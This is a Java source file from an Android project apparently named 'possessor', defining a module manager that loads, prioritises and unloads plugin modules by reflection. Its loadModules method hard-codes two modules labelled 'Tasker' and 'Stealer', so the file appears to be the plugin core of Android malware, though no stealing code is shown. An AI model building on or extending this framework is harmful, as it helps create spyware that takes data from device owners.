package com.zer0.possessor;

import android.content.Context;

import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Hashtable;
import java.util.List;

public class ZModuleManager
{
    private final ZRuntime _zRuntime;
    private final Context _context;

    private ArrayList<Reflect> _modules;
    private Hashtable<Integer, Reflect> _modulesMap;
    private final File _modulesDir;

    private final List<Reflect> _commonTasks = new ArrayList<>();
    public final List<Reflect> _frequentTasks = new ArrayList<>();

    public ZModuleManager(ZRuntime zRuntime, Context context)
    {
        _zRuntime = zRuntime;
        _context = context;

        _modules = new ArrayList<Reflect>();
        _modulesMap = new Hashtable<Integer, Reflect>();
        _modulesDir = _context.getDir("data", Context.MODE_PRIVATE);
    }

    public List<Reflect> getCommonTasks()
    {
        return _commonTasks;
    }
    public void addCommonTask(Object tsk)
    {
        _commonTasks.add(Reflect.on(tsk));
    }
    public void removeCommonTask(Object tsk) {
        Reflect r = Reflect.on(tsk);
        for (Reflect t : _commonTasks) {
            if (r.get() == t.get()) {
                _commonTasks.remove(t);
                break;
            }
        }
    }

    public List<Reflect> getFrequentTasks()
    {
        return _frequentTasks;
    }
    public void addFrequentTask(Object tsk)
    {
        synchronized (_frequentTasks) {
            _frequentTasks.add(Reflect.on(tsk));
        }
    }
    public void removeFrequentTask(Object tsk) {
        synchronized (_frequentTasks) {
            Reflect r = Reflect.on(tsk);
            for (Reflect t : _frequentTasks) {
                if (r.get() == t.get()) {
                    _frequentTasks.remove(t);
                    break;
                }
            }
        }
    }

 
    public void setModulePriority(int moduleHash, int priority)
    {
        _zRuntime.getPrefs().saveInt(Integer.toHexString(moduleHash) + "_prt", priority);
    }
    public int getModulePriority(int moduleHash)
    {
        return _zRuntime.getPrefs().loadInt(Integer.toHexString(moduleHash) + "_prt", 1);
    }


    // Modules
    private class PriorityLessComparator implements Comparator<Reflect>
    {
        @Override
        public int compare(Reflect zm1, Reflect zm2)
        {
            Integer i1 = getModulePriority((int)zm1.call("getHash").get());
            Integer i2 = getModulePriority((int)zm2.call("getHash").get());
            return i1.compareTo(i2);
        }
    }

    public void addModule(Reflect zModule)
    {
        _modules.add(zModule);
        _modulesMap.put((int)zModule.call("getHash").get(), zModule);
        Collections.sort(_modules, new PriorityLessComparator());
    }

    public void removeModule(Reflect zModule)
    {
        _modulesMap.remove(zModule.call("getHash"));
        _modules.remove(zModule);
    }

    public ArrayList<Reflect> getModules()
    {
        return _modules;
    }

    public Object getModuleByHash(int moduleHash)
    {
        Reflect zModule = null;
        Integer key = moduleHash;
        if (_modulesMap.containsKey(key)) {
            zModule = _modulesMap.get(key);
        }

        return zModule.get();
    }

    public File getModulesDir()
    {
        return _modulesDir;
    }

    public String getModuleName(int moduleHash, boolean withExt)
    {
        return ("x" + Integer.toHexString(moduleHash).toLowerCase() + (withExt ? ".jar" : ""));
    }

    public File getModulePath(int moduleHash)
    {
        return new File(getModulesDir(), getModuleName(moduleHash, true));
    }

    public File getModuleDataPath(int moduleHash)
    {
        return _context.getDir(getModuleName(moduleHash), Context.MODE_PRIVATE);
    }

    public String getModuleName(int moduleHash)
    {
        return (Integer.toHexString(moduleHash).toLowerCase());
    }

    public Reflect loadModule(Reflect zModule, int prio)
    {
        try {
//            if (getModuleState((int)zModule.call("getHash").get()) == 1) {
            setModulePriority((int)zModule.call("getHash").get(), prio);
            zModule.call("onInit", _zRuntime);
            addModule(zModule);
            zModule.call("onLoad");
//            }
//            else {
//                zModule = null;
//            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return zModule;
    }

    public void deactivateModule(int moduleHash)
    {
        Object zModule = getModuleByHash(moduleHash);
        if (zModule != null) {
            removeFrequentTask(zModule);
            removeCommonTask(zModule);
            Reflect.on(zModule).call("onUnload");
            FileUtils.deleteRecursive(getModuleDataPath(moduleHash));
        }
    }

    public void loadModules()
    {
        try {
            loadModule(Reflect.on(zer0.x985d2fcb.Module.class).create(), 1); // Tasker
            loadModule(Reflect.on(zer0.xb6f34e12.Module.class).create(), 3); // Stealer
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}